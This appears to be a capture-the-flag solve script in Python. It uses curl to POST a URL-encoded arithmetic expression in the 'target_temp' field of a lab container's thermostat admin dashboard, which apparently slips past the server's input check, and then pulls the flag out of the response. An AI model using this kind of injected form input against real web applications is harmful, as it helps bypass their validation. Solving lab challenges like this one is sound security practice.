import subprocess

# Need to update the ip
url = "http://172.17.0.2:4000/admin-thermostat-dashboard"
data = "target_temp=5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B4"

try:
    result = subprocess.run(
        ["curl", "-X", "POST", url, "-d", data],
        check=True,
        text=True,
        capture_output=True
    )
    # print("Output:", result.stdout)
    flag = str(str(result.stdout).split("Fine you win :( ")[1]).split("</p>")[0]
    print(flag)
    # print("Error (if any):", result.stderr)
except subprocess.CalledProcessError as e:
    print("Command failed with return code:", e.returncode)
    print("Error output:", e.stderr)